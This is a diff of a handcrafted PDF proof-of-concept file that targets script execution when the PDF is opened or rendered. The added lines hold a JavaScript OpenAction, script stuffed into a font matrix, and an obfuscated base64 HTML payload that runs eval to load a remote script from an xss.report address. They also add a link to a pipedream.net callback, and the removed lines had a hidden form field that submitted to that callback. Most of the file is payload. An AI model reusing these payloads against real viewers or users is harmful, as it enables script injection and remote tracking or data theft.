@@ -1,55 +1,64 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>
+<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('PoC v0: XSS on Open!', 3);) >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [11 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R] >>
 endobj
 4 0 obj
-<< /Length 100 >>
+<< /Length 120 >>
 stream
 BT
 /F1 14 Tf
 100 700 Td
-(PoC v2: Click link to send) Tj
-100 650 Td[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2=1) Tj
+(PoC v0: Click link to send request) Tj
+100 650 Td
+(https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v0=1) Tj
 ET
+q
+100 0 0 100 100 550 cm
+/Img1 Do
+Q
 endstream
 endobj
 5 0 obj
-<< /Font << /F1 6 0 R >> >>
+<< /Font << /F1 6 0 R >> /XObject << /Img1 8 0 R >> >>
 endobj
 6 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >>
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [0.001 0 0 0.001 0 0 (app.alert('PoC v0: FontMatrix XSS!');)] >>
 endobj
 7 0 obj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
-10 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Tx /T (HiddenField) /V () /Rect [0 0 0 0] /A << /S /SubmitForm /F[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2_hidden=1) /Flags 4 >> >>
+8 0 obj
+<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << >> /Length 150 >>
+stream
+% Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+/GS0 gs
+EMC
+endstream
 endobj
-11 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI[](https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v2=1) >> >>
+10 0 obj
+<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI (https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v0=1) >> >>
 endobj
 xref
-0 12
+0 11
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
 0000000152 00000 n 
 0000000245 00000 n 
-0000000345 00000 n 
-0000000415 00000 n 
-0000000527 00000 n 
+0000000385 00000 n 
+0000000485 00000 n 
+0000000597 00000 n 
+0000000663 00000 n 
 0000000000 65535 f 
-0000000000 65535 f 
-0000000613 00000 n 
-0000000775 00000 n 
+0000000813 00000 n 
 trailer
-<< /Size 12 /Root 1 0 R >>
+<< /Size 11 /Root 1 0 R >>
 startxref
 950
 %%EOF
